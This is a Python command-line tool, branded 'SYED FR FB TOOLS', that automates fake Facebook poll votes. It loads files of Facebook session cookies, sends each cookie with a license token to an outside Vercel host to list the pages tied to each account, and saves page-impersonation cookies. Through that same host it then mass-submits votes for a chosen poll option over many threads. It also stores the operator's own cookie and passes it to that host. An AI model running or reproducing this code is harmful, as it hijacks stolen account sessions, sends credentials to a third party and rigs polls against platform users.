#!/usr/bin/env python
import sys
import time
import re
import os
import json
import string
import random
try:import brotli, requests
except:os.system('pip install brotli requests')
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from hashlib import md5
from platform import uname
import urllib.parse
import requests, brotli
# MODULES WORKING WITH
token  = 'fb00f8a2c8678343b86d5dc43d015fd9'
rd='\033[38;5;208m'
grnh='\033[1;32m'
grn='\033[38;5;42m'
rdh='\033[1;31m'
yl='\033[38;5;220m'
bl='\033[38;5;38m'
bk1='\033[38;5;235m'
bk2='\033[38;5;238m'
bk3='\033[38;5;250m'
bk4='\033[38;5;255m';en='\033[0m'
unk=f'\033[38;5;{random.randint(1,200)}m'
ok=[];dd=[];tts=[1];cp=[];ts=['t'];sp=[None]
line="-"*63;letters=sorted(string.ascii_uppercase)
stop=[False]
zcookie = [None]
access = f'''{bk3}
[YOUR ACCESS IS DENIED] - CONTACT OWNER
[CONTACT : +923094043276 (WhatsApp) ]{grnh}
[YOUR KEY: {yl}{token}{grnh} ]{en}
'''
class Facebook:
	def __init__(self):
		self.clear()
		self.android = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
		self.desktop  = ""
		self.banner   = f"""{grnh}
 {line}
    _______      ______ _______ ______   _____   _____  _    _ 
  (_______)\\   / _____|_______|____  \\ / ___ \\ / ___ \\| |  / )
   _____ /  \\ | /      _____   ____)  ) |   | | |   | | | / / 
  |  ___) /\\ \\| |     |  ___) |  __  (| |   | | |   | | |< <  
  | |  | |__| | \\_____| |_____| |__)  ) |___| | |___| | | \\ \\ 
  |_|  |______|\\______)_______)______/ \\_____/ \\_____/|_|  \\_)
                                                            
  ------------------------------------------------------------
 [ Tools Name     : SYED FR FB TOOLS                           ]
 [ Status         : OWN                                        ]
 [ Contact        : #+923094043276                             ]
 [ Address        : PAKISTAN                                   ]
 [ Time & Date    : {datetime.now()}                 ]
  ------------------------------------------------------------{en}"""
	def bannerx(self):
		self.clear()
		print(self.banner)
	def clear(self):
		os.system('clear')
	def saveUidCookie(self,filename,cookie,uid):
		with open(filename,'a') as f:
			f.write(f'{uid}|{cookie}\n')
	def savePidCookie(self,filename,cookiez,pid):
		lcookie = cookiez.split(';');random.shuffle(lcookie)
		xcookie = list(filter(None,lcookie))
		cookie=''.join(f'{c};' for c in xcookie)
		with open(filename,'a') as f:
			f.write(f'{pid}|{cookie}\n')
	def get_pages(self,session,cookie,uid):
		with session.get(f'https://hamidali867.vercel.app/getpages2?cookie={cookie}&token={token}&id={uid}') as response:
			return response.json()
	def get_id_question(self,session):
		with session.get(input(f"\r {grnh}ENTER POST LINK{en}: ").replace('www.','mbasic.').replace('web.','mbasic.').replace('m.','mbasic.'),cookies={'cookie':zcookie[0]}) as responses:
			qid = None
			try:qid=re.search(r'id="text(\d+)"',responses.text).group(1)
			except:return {'status':'bad'}
			return {'status':'ok','qid':qid}
	def generate_cookies(self,cookie,uid,sv):
		sys.stdout.write(f"\r{yl}TOTAL:{len(ts)}/{tts[0]}|SUCCESS[{grn}{len(ok)}{yl}]{en}")
		with requests.Session() as session:
			pageslist = self.get_pages(session,cookie,uid)
			xc=1
			if pageslist['status']=='ok':
				ok.append('t')
				for page in pageslist['data']:
					pcookie=f'{cookie};i_user={page}'
					self.savePidCookie(sv,pcookie,page)
					print(f'\r [{bl}{xc}{en}] - {page} [{grn}done{en}]');xc+=1
			elif pageslist['status']=='no':print(f'\r [No pages found - {uid}]')
			else:print(f'\r [Invalid Cookie / Expired - {uid}]');dd.append('t')
	#/// SUBMIT DATA FROM HERE ///
	def votes(self,cookie,pid,qid,oid):
		sys.stdout.write(f"\r{yl}TOTAL:{len(ts)}/{tts[0]}|SUCCESS[{grn}{len(ok)}{yl}]{en}")
		with requests.Session() as session:
			status = session.get(f'https://hamidali867.vercel.app/vote?cookie={cookie}&pid={pid}&qid={qid}&oid={oid}&token={token}').json()
			ts.append('t')
			if status['status']=='ok':print(f"\r {grnh}[{len(ok)}]status:ok|{pid}{en}");ok.append('o')
			elif status['status']=='no':print(f"\r {rd}[xx]status:no|{pid}{en}")
			elif status['status']==403 or status['status']=='403':input(access);sys.exit()
			else:print(f'\r [{yl}Reconnect network{en}|{pid} - cookie has expired]')
	def pollNames(self,cookiefile,qid):
		cookie = urllib.parse.quote(zcookie[0])
		with requests.Session() as session:
			jsondata = session.get(f'https://hamidali867.vercel.app/pollnames?cookie={cookie}&qid={qid}&token={token}').json()
			if jsondata['status']=='ok':
				xc=1
				for data in jsondata['data']:
					print(f'\r[{bl}{xc}{en}] - {data["name"]}|{data["votes"]}');xc+=1
				opn = int(input(f'{rd}option{en}>>'))-1
				oid,name = jsondata['data'][opn]['oid'],jsondata['data'][opn]['name']
				input(f'\r {grnh}[{bl}press enter to continue{grnh}] Target Set - {name}]{en}')
				print(f'\r [{bl}process has been started{en}]')
				print(f'\r{line}')
				with ThreadPoolExecutor(max_workers=sp[0]) as tp:
					for account in cookiefile:
						try:
							vcookie = account.split('|')
							pid     = vcookie[0]
							pcookie = vcookie[1]
							tp.submit(self.votes,pcookie,pid,qid,oid)
						except requests.exceptions.ConnectionError:print('\r No internet, press enter to continue..')
						# except Exception as e:print('\r Something went wrong..');time.sleep(10)
			else:print(f'\r [Invalid or cookie has expired]')
		reslt=f"""\r
 {line}
 process has been completed...
 {line}
 Total Accounts   : {tts[0]},
 Total  Votes     : {len(ok)},
 Total dead ids   : {len(dd)},
 >>>>
		"""
		open('last_result.txt','w').write(reslt)
		input(reslt)
		self.menu()
		sys.exit()
	def generate_cookiesOS(self):
		file    = list(filter(None,open(input(f" [+]{grnh}ENTER IDS FILEPATH{en}: ")).read().split('\n')))
		tts[0]  = len(file)
		sv      = input(f'\r {grnh}Save as filename{en}: ')
		for xaccount in file:
			account = xaccount.split('|')
			uid     = account[0]
			cookie  = account[2]
			self.generate_cookies(cookie,uid,sv)
		reslt=f"""\r
 {line}
 process has been completed!
 {line}
 Total Accounts     : {len(file)},
 Total  success     : {len(ok)},
 Total dead ids     : {len(dd)},
>>>>invalid/dead ids saved in 'dead_ids.txt'
		"""
		open('last_result.txt','w').write(reslt)
		input(reslt)
		self.menu()
		sys.exit()
	def voteOS(self):
		cookiefile = list(filter(None,open(input(f" [+]{grnh}ENTER PAGE_COOKIES FILEPATH{en}: ")).read().split('\n')))
		tts[0]     = len(cookiefile)
		qid        = input(f'\r {grnh}Enter Question Id{en}: ')
		if not len(qid)>8:print('Invalid question id');time.sleep(2);self.menu();sys.exit()
		sp[0]      = int(input(f'\r {grnh}Set Process Speed{en}: '))
		self.pollNames(cookiefile,qid);sys.exit()
	def get_id_questionOS(self):
		with requests.Session() as session:
			session.headers.update({"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","accept-language": "en-US,en;q=0.9","save-data": "on","user-agent": self.android,"sec-ch-ua": "\"Google Chrome\";v=\"112\", \"Chromium\";v=\"112\", \"Not=A?Brand\";v=\"24\"","sec-ch-ua-mobile": "?1","sec-ch-ua-platform": "\"Android\"","sec-fetch-dest": "document","sec-fetch-mode": "navigate","sec-fetch-site": "none","sec-fetch-user": "?1","upgrade-insecure-requests": "1","referrerPolicy": "strict-origin-when-cross-origin"})
			status = self.get_id_question(session)
			if status['status']=='ok':
				print("Copy your question id below..")
				input(f'\r{yl} Your question id is: {status["qid"]}{en}');self.menu();sys.exit()
			else:print(f'\r [Invalid or cookie has expired]')
	def contact(self):
		input('WhatsApp: +923094043276')
	def menu(self):
		self.clear()
		ts.clear()
		ok.clear()
		cp.clear()
		dd.clear()
		self.status=None
		print(self.banner)
		print(f'''{bk3}
 {bl}{line}{yl}
                   SELECT ANY OPTION{bl}
 {line}{bk3}
 [1 - GENERATE PAGE_COOKIE]
 [2 - AUTO VOTES MACHINE]
 [3 - GET QUESTION ID]
 [4 - CONTACT]
 {bl}{line}{bk3}
 [0 - Quit.
 {bl}{line}{en}''')
		try:
			opt=input(f" {rd}option{en}>>")
			if opt in ['01','1']:self.generate_cookiesOS();sys.exit()
			elif opt in ['02','2']:self.voteOS();sys.exit()
			elif opt in ['03','3']:self.get_id_questionOS();sys.exit()
			elif opt in ['04','4']:self.contact();sys.exit()
			elif opt in ['0','00']:sys.exit('See you later!')
			else:print(' invalid option')
		except KeyboardInterrupt:print(f" {yl}See you later{en}: ");time.sleep(1);sys.exit()
		except FileNotFoundError:print(' file location not found..');time.sleep(1);self.menu();sys.exit()
	def check_cookie(self):
		# cookie = None
		try:cookie = open('cookie.txt','r').read();zcookie[0] = cookie
		except:
			cookie = input(f'\r {yl}Input a valid Cookie{en}: ')
			with open('cookie.txt','w') as wih:
				wih.write(cookie);zcookie[0]=cookie
		try:
			uid = re.search(r'c_user=(\d+)',cookie).group(1)
			with requests.Session() as session:
				with session.get(f'https://hamidali867.vercel.app/getpages2?cookie={cookie}&token={token}&id={uid}') as response:
					status = response.json()
					if status['status']=='ok' or status['status']=='no':
						self.menu();sys.exit()
					elif status['status']=='bad':
						print(f'\r [Invalid or cookie has expired]')
						try:os.remove('cookie.txt');time.sleep(2)
						except:pass
					elif status['status']==403 or status['status']=='403':input(access);sys.exit()
					else:sys.exit(f'\rSomething went wrong - {status}')
		except KeyboardInterrupt:sys.exit('stopped')
		except requests.exceptions.ConnectionError:sys.exit('\rNo internet')
		except Exception as e:sys.exit(f'\r Something went wrong, try again.')
fb    = Facebook()
fb.check_cookie()
